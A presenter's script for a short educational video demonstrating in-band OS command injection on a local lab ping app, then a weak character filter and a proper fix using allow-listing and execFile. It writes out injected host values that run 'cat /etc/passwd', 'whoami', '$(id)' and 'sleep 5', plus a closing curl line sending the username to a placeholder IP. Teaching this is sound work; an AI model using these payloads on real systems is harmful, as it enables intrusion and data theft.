# Video script — OS Command Injection (In-band) — easy/natural version

**Speaker: Kavyan** · ~3:30 (max 4:00) · Variant: In-band command injection

Setup: run `node server.js`, open http://localhost:3000. Keep the payloads copy-paste
ready. One server, two pages — just click between them, no restarting. Talk normally.

---

### 0:00 – 0:20 — Intro
**DO:** Show the landing page at http://localhost:3000.
**SAY:**
> "Hi, I'm Kavyan. My part is **OS command injection**. In simple words — this app is
> supposed to just ping a website or IP you type in. I've got two pages here: a vulnerable
> one and a fixed one. I'll show the attack on the vulnerable page, then show my fix."

### 0:20 – 0:40 — Normal use
**DO:** Click **Vulnerable version**. Host = `127.0.0.1`, click Ping.
**SAY:**
> "This is the vulnerable page. I type `127.0.0.1` and hit Ping — I get a normal ping reply.
> Looks totally fine. But the way it runs that command behind the scenes is the problem."

### 0:40 – 1:30 — The attack
**DO:** Host = `127.0.0.1; cat /etc/passwd` → Ping.
**SAY:**
> "Now instead of just an IP, I type `127.0.0.1`, a semicolon, then `cat /etc/passwd`. And
> look — I get the ping reply *plus* the system's whole password file. That semicolon means
> 'ping is done, now run my command too,' and the file comes straight back to me."

**DO:** Host = `127.0.0.1 | whoami` → Ping.
**SAY:**
> "It's not only the semicolon. With a pipe — `127.0.0.1 | whoami` — it tells me which user
> the server runs as. So I can basically run anything."

**DO:** Host = `127.0.0.1; sleep 5` → Ping. Point at the response time.
**SAY:**
> "And even when a command shows no output, I still know it ran. I type `sleep 5`, and the
> page just waits five seconds before replying. That delay alone proves my command ran."

### 1:30 – 1:55 — Why it happens
**DO:** Switch to the editor, show `server.js`, point at the `/api/vuln` block —
`exec("ping -c 1 " + host)`.
**SAY:**
> "Here's why. The code just glues whatever I type onto the ping command and sends the whole
> thing to the system shell. The shell sees that semicolon or pipe and treats it as a real
> instruction, not plain text. So my input becomes a command. That's the bug — user input
> going straight into a shell command."

### 1:55 – 2:30 — First fix attempt (and why it's weak)
**DO:** Go back, click **Fixed version**. In the dropdown pick **/api/fixed-weak**.
Host = `127.0.0.1; cat /etc/passwd` → Ping (blocked). Then `127.0.0.1 $(id)` → Ping (runs).
**SAY:**
> "On the fixed page I first show a weak attempt. This route just blocks the semicolon — see,
> now it says blocked. But that's not a real fix. I switch to `$(id)`, with no semicolon at
> all — and it still runs, you can see the output. There are too many of these tricks to block
> one by one, so filtering characters fails."

### 2:30 – 3:15 — The real fix
**DO:** Switch the dropdown to **/api/fixed**. Host = `127.0.0.1; cat /etc/passwd` → Ping →
`[rejected] invalid host`. Then Host = `127.0.0.1` → Ping → normal output. Show the
`/api/fixed` block in `server.js` (the `HOST_RE` line and `execFile(...)`).
**SAY:**
> "This is my real fix. The same attack that stole the password file a minute ago — now it
> just says 'invalid host' and does nothing. But a real IP still works normally. I did two
> things. One, I only allow normal host characters — letters, numbers, dots. And two, the
> important one: instead of sending a text string to the shell, I run `ping` directly and pass
> whatever the user typed as just one plain value. There's no shell anymore, so a semicolon is
> only a semicolon — it can't run anything."

### 3:15 – 3:35 — Other fixes + ending
**DO:** Show the README mitigation section or a slide.
**SAY:**
> "There are other defences too — checking input against a strict allow-list, which I also
> did, and running the app with very low permissions so even a successful attack can't do much.
> But the best one is simply not using the shell at all, which is what my fix does. So that's
> my part: I showed the attack working, then shut it down. Thanks."

---

**If you're long:** skip the `| whoami` demo — the password-file one and `sleep 5` are enough.
**If you're short:** add the out-of-band demo — run `python3 -m http.server 8000`, then
`127.0.0.1; curl http://<YOUR_IP>:8000/$(whoami)` and show the request arrive with your username.
